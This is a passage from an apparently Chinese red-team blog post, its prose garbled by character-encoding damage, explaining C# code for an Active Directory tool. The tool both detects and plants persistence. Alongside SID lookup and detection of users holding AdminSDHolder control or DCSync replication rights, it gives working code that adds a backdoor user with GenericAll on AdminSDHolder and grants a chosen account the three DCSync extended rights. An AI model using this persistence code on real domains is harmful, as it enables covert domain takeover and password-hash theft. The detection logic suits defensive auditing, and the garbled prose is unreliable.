class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">//sid to username</span><br><span class="line">public static string SidToUserName(string sid)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        string url = &quot;LDAP://&quot; + GetArgsValue.domain + &quot;/&lt;SID=&quot; + sid + &quot;&gt;&quot;;</span><br><span class="line">        Ldapcoon.coon.Path = url;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string users = &quot;&quot;;</span><br><span class="line">            users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (users != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return users;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=group))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string groups = &quot;&quot;;</span><br><span class="line">            groups = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (groups != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return groups;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=computer))&quot;;</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string computers = &quot;&quot;;</span><br><span class="line">            computers = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            if (computers != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                return computers;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;error&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ldapç”¨æ”¯æŒä»¥ä¸‹è¯­æ³•è¿™ç§å½¢å¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDAP://192.168.11.16/&lt;SID=xxxxxxxxxx&gt;</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æˆ‘ä»¬æŠŠsidå¸¦å…¥ï¼Œè®¾ç½®coon.pathä¸ºè¯¥ç”¨æˆ·å†é€šè¿‡(&amp;(objectClass=user)(objectCategory=person))è¿‡æ»¤æ¡ä»¶æœç´¢å‡ºæ¥ï¼Œæ¯”å¦‚<br>â€‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img19@main/2021/10/01/1633088516986-4eaffbea-f3dc-48c2-b0bd-21a003d74749.png"></p>
<p>æˆ‘ä»¬ç»‘å®šäº†hackç”¨æˆ·ä¸ºrootpathï¼Œé‚£ä¹ˆé€šè¿‡è¿‡æ»¤æ¡ä»¶æœç´¢å‡ºæ¥çš„ä¹Ÿæ˜¯å®ƒè‡ªå·±ï¼Œå› ä¸ºå®ƒæ²¡æœ‰å­èŠ‚ç‚¹äº†ã€‚ç„¶åè·å–ä»–çš„nameå€¼ï¼Œå½“è·å–åˆ°çš„ä¸ä¸ºç©ºå°±è¿”å›ï¼Œå¦åˆ™å°±è¿”å›errorï¼Œç„¶ååœ¨adminsdholderæ£€æµ‹ä»£ç è¿™è¾¹æˆ‘ä»¬å†™é“<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string acl = rule.IdentityReference.Value;</span><br><span class="line">if (acl.Contains(&quot;-&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    //åŸŸå¤–æŸ¥è¯¢å¯èƒ½ä¼šå‡ºç°ç”¨æˆ·åä¸ºsidçš„æƒ…å†µã€‚æ‰€ä»¥éœ€è¦è½¬æ¢</span><br><span class="line">    //Console.WriteLine(acl);</span><br><span class="line">    string user_name = public_value.SidToUserName(acl);</span><br><span class="line">    if(user_name != &quot;error&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(user_name);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>

<p>å½“user_nameä¸ä¸ºerrorçš„æ—¶å€™å°±ä¼šè¾“å‡ºï¼Œé‚£ä¹ˆä»€ä¹ˆæ—¶å€™ä¼šè¾“å‡ºerrorå‘¢ï¼Ÿå‡å¦‚æˆ‘ä»¬ä»¥å‰æœ‰ä¸€ä¸ªç”¨æˆ·ä¸ºqqqï¼Œç„¶åä»–å¯¹adminsdholderè¿™ä¸ªç»„æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬åæ¥æŠŠè¿™ä¸ªç”¨æˆ·åˆ é™¤äº†ï¼Œä»–å°±ä¼šåˆ°ä¸€ä¸ªCN=Deleted Objectsé‡Œé¢ä»–çš„sidå°±ä¸ºurlå°±ä¸ºä¸‹é¢è¿™ä¸ªç„¶åæˆ‘ä»¬çš„LDAP://redteam/&lt;SID=xxx&gt;å°±ä¼šå¤±è´¥ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=qqqDEL:67e38247-2727-4c5a-8704-c9f33ad747da,CN=Deleted Objects,DC=redteam,DC=local</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨åŒ¹é…è°å¯¹adminsdholderæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™çš„æ—¶å€™è¿˜æ˜¯ä¼šæ£€æµ‹åˆ°ã€‚å°±æœç´¢å¤±è´¥è¿”å›errorï¼Œè¿™é‡Œæˆ‘ä»¬è·å–åˆ°errorçš„ç›´æ¥continueã€‚<br>â€‹</p>
<h2 id="4-2-æ·»åŠ "><a href="#4-2-æ·»åŠ " class="headerlink" title="4.2 æ·»åŠ "></a>4.2 æ·»åŠ </h2><p>å‰é¢åŒç†æˆ‘ä»¬éœ€è¦è®¾ç½®rootpath</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Ldapcoon.LDAP_COON();</span><br><span class="line">//è·å–DC=redteam,DC=local</span><br><span class="line">string distinguishedName = &quot;&quot;;</span><br><span class="line">string domainname = &quot;&quot;;</span><br><span class="line">domainname = public_value.Get_Dns_First_Name();</span><br><span class="line">distinguishedName = public_value.GetdistinguishedName();</span><br><span class="line"></span><br><span class="line">//string AdminSDHolder_Path = &quot;LDAP://192.168.11.16/CN=System,DC=redteam,DC=local&quot;;</span><br><span class="line">string AdminSDHolder_Path = &quot;LDAP://&quot; + domainname + &quot;/&quot; + &quot;CN=System,&quot; + distinguishedName;</span><br><span class="line">//Console.WriteLine(AdminSDHolder_Path);</span><br><span class="line">Ldapcoon.coon.Path = AdminSDHolder_Path;</span><br></pre></td></tr></table></figure>

<p>èµ‹äºˆç”¨æˆ·å¯¹adminsdholderå®Œå…¨æ§åˆ¶æƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">foreach (DirectoryEntry computer in Ldapcoon.coon.Children)</span><br><span class="line">&#123;</span><br><span class="line">    if (computer.Name == &quot;CN=AdminSDHolder&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        ActiveDirectorySecurity sdc = computer.ObjectSecurity;</span><br><span class="line">        NTAccount Account = new NTAccount(username);</span><br><span class="line">        SecurityIdentifier Sid =(SecurityIdentifier)Account.Translate(typeof(SecurityIdentifier));</span><br><span class="line">        ActiveDirectoryAccessRule rule = new ActiveDirectoryAccessRule(Sid,ActiveDirectoryRights.GenericAll,AccessControlType.Allow);</span><br><span class="line">        sdc.SetAccessRule(rule);</span><br><span class="line">        computer.CommitChanges();</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;AdminSDHolder back door add user &quot;+ username + &quot; success!!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å…ˆéå†èŠ‚ç‚¹å½“èŠ‚ç‚¹ä¸ºCN=AdminSDHolderçš„æ—¶å€™è·å–ä»–çš„å®‰å…¨è§„åˆ™é›†åˆ<br>â€‹</p>
<p>ç„¶åæˆ‘ä»¬çœ‹åˆ°ActiveDirectoryAccessRuleç±»ï¼šç”¨äºè¡¨ç¤º Active Directory åŸŸæœåŠ¡å¯¹è±¡çš„è‡ªç”±è®¿é—®æ§åˆ¶åˆ—è¡¨ (DACL) ä¸­çš„è®¿é—®æ§åˆ¶é¡¹ (ACE)ã€‚<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectoryAccessRule(IdentityReference, ActiveDirectoryRights, AccessControlType)</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ªIdentityReferenceå¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè®¿é—®è§„åˆ™æƒé™çš„ä¸€ä¸ªæˆ–å¤šä¸ªï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºè®¿é—®è§„åˆ™ç±»å‹ã€‚<br>â€‹</p>
<p>æˆ‘ä»¬å‰é¢çš„accountä¸ºNTAccountç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡TranslateæŠŠä»–è½¬æ¢ä¸ºIdentityReferenceç±»å‹ï¼Œç„¶åç¬¬äºŒä¸ªæˆ‘ä»¬è®¾ç½®ä¸ºGenericAllï¼Œç¬¬ä¸‰ä¸ªè®¾ç½®ä¸ºå…è®¸ã€‚æˆ‘ä»¬è®¾ç½®äº†è¿™ä¸ªè§„åˆ™åå¯ä»¥é€šè¿‡SetAccessRuleæ–¹æ³•æ¥è®¾ç½®ã€‚<br>â€‹</p>
<p>æœ€åé€šè¿‡CommitChangesæ–¹æ³•æ¥è¿›è¡Œæ·»åŠ ã€‚<br>â€‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img11@main/2021/10/01/1633088532594-ada9c117-a54f-4d77-b713-43b2fad42b83.png"></p>
<h1 id="0x05-Dcsyncæ£€æµ‹ä¸åé—¨ç”¨æˆ·æ·»åŠ "><a href="#0x05-Dcsyncæ£€æµ‹ä¸åé—¨ç”¨æˆ·æ·»åŠ " class="headerlink" title="0x05 Dcsyncæ£€æµ‹ä¸åé—¨ç”¨æˆ·æ·»åŠ "></a>0x05 Dcsyncæ£€æµ‹ä¸åé—¨ç”¨æˆ·æ·»åŠ </h1><h2 id="5-1-æ£€æµ‹"><a href="#5-1-æ£€æµ‹" class="headerlink" title="5.1 æ£€æµ‹"></a>5.1 æ£€æµ‹</h2><p>å½“ç”¨æˆ·å¯¹æ ¹åŸŸæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™æˆ–è€…æ‹¥æœ‰ä»¥ä¸‹ä¸‰æ¡aceæˆ–è€…å¯¹ä»¥ä¸‹æƒé™æ‰“å‹¾çš„æ—¶å€™å°±èƒ½dcsyncã€‚<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">89e95b76-444d-4c62-991a-0facbeda640c</span><br></pre></td></tr></table></figure>




<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088546852-d4974e77-7b91-4246-a76c-63766d749206.png"></p>
<p>æˆ‘ä»¬å…ˆç»‘å®šrootpathä¸ºæ ¹è·¯å¾„ç„¶åå…ˆåˆ¤æ–­æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™çš„ç”¨æˆ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (rule.ActiveDirectoryRights.ToString().Equals(&quot;GenericAll&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    string acl = rule.IdentityReference.Value;</span><br><span class="line">    if (acl.Contains(&quot;-&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        //åŸŸå¤–æŸ¥è¯¢å¯èƒ½ä¼šå‡ºç°ç”¨æˆ·åä¸ºsidçš„æƒ…å†µã€‚æ‰€ä»¥éœ€è¦è½¬æ¢</span><br><span class="line">        //Console.WriteLine(acl);</span><br><span class="line">        string user_name = public_value.SidToUserName(acl);</span><br><span class="line">        if (user_name != &quot;error&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            ACE_Changes.Add(user_name);</span><br><span class="line">            ACE_Changes_All.Add(user_name);</span><br><span class="line">            ACE_Changes_In_Filtered_Set.Add(user_name);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        ACE_Changes.Add(acl);</span><br><span class="line">        ACE_Changes_All.Add(acl);</span><br><span class="line">        ACE_Changes_In_Filtered_Set.Add(acl);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ACE_Changes.Add(acl);</span><br><span class="line">ACE_Changes_All.Add(acl);</span><br><span class="line">ACE_Changes_In_Filtered_Set.Add(acl);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘é€šè¿‡switch caseæ¥è¿›è¡Œåˆ¤æ–­æ˜¯å¦æ‹¥æœ‰è¿™ä¸ªä¸‰æ¡aclï¼Œå¯èƒ½æœ‰äº›ç”¨æˆ·åªæœ‰ä¸¤æ¡æˆ–è€…ä¸€æ¡ï¼Œæ‰€ä»¥æˆ‘é€šè¿‡<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">string guids = rule.ObjectType.ToString();</span><br><span class="line">switch (guids)</span><br><span class="line">&#123;</span><br><span class="line">  case &quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if(username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:å¤åˆ¶ç›®å½•æ›´æ”¹&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot;+ username);</span><br><span class="line">    ACE_Changes.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:å¤åˆ¶ç›®å½•æ›´æ”¹å…¨éƒ¨&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_All.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:å¤åˆ¶è¿‡æ»¤é›†ä¸­çš„ç›®å½•æ›´æ”¹&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_In_Filtered_Set.Add(username);</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥è¿›è¡Œå¤„ç†ï¼Œå½“æ‹¥æœ‰æ¯æ¡aclçš„æ—¶å€™å°±æ·»åŠ åˆ°ä¸€ä¸ªé›†åˆé‡Œé¢ï¼Œç„¶åæˆ‘ä»¬å†å–ä¸‰ä¸ªé›†åˆçš„äº¤é›†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//å–ä¸‰ä¸ªé›†åˆçš„äº¤é›†</span><br><span class="line">IEnumerable&lt;string&gt; dcsync_users1 = ACE_Changes.Intersect(ACE_Changes_All);</span><br><span class="line">IEnumerable&lt;string&gt; dcsync_users2 = dcsync_users1.Intersect(ACE_Changes_In_Filtered_Set);</span><br><span class="line">foreach(string dcsync_users in dcsync_users2)</span><br><span class="line">&#123;</span><br><span class="line">	Console.WriteLine(dcsync_users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä»¥ä¸Šæ–¹æ³•å–å‡ºæ¥æˆ‘å‘ç°äº†ä¸€ä¸ªé—®é¢˜å½“ä¸€ä¸ªç”¨æˆ·å‹¾é€‰äº†ç‰¹æ®Šæƒé™ï¼Œä»–çš„aclé‡Œé¢é‚£ä¸‰ä¸ªå¤åˆ¶ç›®å½•æƒé™æ˜¯æ²¡æœ‰æ‰“ä¸Šå‹¾çš„ä½†æ˜¯ä¾ç„¶èƒ½å¤Ÿè¿›è¡Œdcsyncã€‚<br>â€‹</p>
<p>å†ActiveDirectoryAccessRuleç±»é‡Œé¢å­˜åœ¨ä¸€ä¸ªInheritedObjectTypeå±æ€§ï¼Œä»–çš„ä½œç”¨æ˜¯è·å–å¯ç»§æ‰¿ObjectAccessRuleå¯¹è±¡çš„å­å¯¹è±¡çš„ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿè¦åˆ¤æ–­ç”¨æˆ·è¿™é‡Œé¢çš„å€¼æ˜¯å¦ä¹Ÿç”¨æˆ·è¿™ä¸‰æ¡aclã€‚<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">string guids_extend = rule.InheritedObjectType.ToString();</span><br><span class="line">switch (guids_extend)</span><br><span class="line">&#123;</span><br><span class="line">  case &quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">  username = dcsync_return_username(rule);</span><br><span class="line">  if (username == null)</span><br><span class="line">  &#123;</span><br><span class="line">  	continue;</span><br><span class="line">  &#125;</span><br><span class="line">  //Console.WriteLine(&quot;ACE:å¤åˆ¶ç›®å½•æ›´æ”¹&quot;);</span><br><span class="line">  //Console.WriteLine(&quot;User:&quot;+ username);</span><br><span class="line">  ACE_Changes.Add(username);</span><br><span class="line">  break;</span><br><span class="line">	case &quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:å¤åˆ¶ç›®å½•æ›´æ”¹å…¨éƒ¨&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_All.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;:</span><br><span class="line">  username = dcsync_return_username(rule);</span><br><span class="line">  if (username == null)</span><br><span class="line">  &#123;</span><br><span class="line">  	continue;</span><br><span class="line">  &#125;</span><br><span class="line">  //Console.WriteLine(&quot;ACE:å¤åˆ¶è¿‡æ»¤é›†ä¸­çš„ç›®å½•æ›´æ”¹&quot;);</span><br><span class="line">  //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">  ACE_Changes_In_Filtered_Set.Add(username);</span><br><span class="line">  break;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>


<h2 id="5-2-æ·»åŠ "><a href="#5-2-æ·»åŠ " class="headerlink" title="5.2 æ·»åŠ "></a>5.2 æ·»åŠ </h2><p>æˆ‘ä»¬é€šè¿‡ExtendedRightAccessRuleç±»æ¥æ·»åŠ è¿™ä¸‰æ¡aclçš„guid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public ExtendedRightAccessRule (System.Security.Principal.IdentityReference identity, System.Security.AccessControl.AccessControlType type, Guid extendedRightType);</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªä¸ºSecurityIdentifierçš„å¯¹è±¡ï¼Œå‰é¢å·²ç»è¯´æ˜äº†ã€‚ç¬¬äºŒä¸ªä¸ºè®¿é—®è§„åˆ™ç±»å‹ã€‚ç¬¬ä¸‰ä¸ªä¸ºaclçš„guidã€‚<br>â€‹</p>
<p>ç„¶åé€šè¿‡AddAccessRuleæ¥æ·»åŠ ã€‚<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectorySecurity adsOUSec = Ldapcoon.coon.ObjectSecurity;</span><br><span class="line">NTAccount ntaToDelegate = new NTAccount(username);</span><br><span class="line">SecurityIdentifier Sid = (SecurityIdentifier)ntaToDelegate.Translate(typeof(SecurityIdentifier));</span><br><span class="line">Guid Get_Changes = new Guid(&quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;);</span><br><span class="line">Guid Get_Changes_All = new Guid(&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;);</span><br><span class="line">Guid ACE_Changes_In_Filtered = new Guid(&quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;);</span><br><span class="line">ExtendedRightAccessRule Changes = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, Get_Changes);</span><br><span class="line">ExtendedRightAccessRule Changes_All = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, Get_Changes_All);</span><br><span class="line">ExtendedRightAccessRule Changes_Filtered = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, ACE_Changes_In_Filtered);</span><br><span class="line">adsOUSec.AddAccessRule(Changes);</span><br><span class="line">adsOUSec.AddAccessRule(Changes_All);</span><br><span class="line">adsOUSec.AddAccessRule(Changes_Filtered);</span><br><span class="line">Ldapcoon.coon.CommitChanges()</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088565777-50f3824e-76ce-434b-b497-6763af4e7baf.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088582319-4254af82-8604-4d89-9d9b-77ffc1ecc06d.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://avatars.githubusercontent.com/u/47177122?v=4"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">1</span>

  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

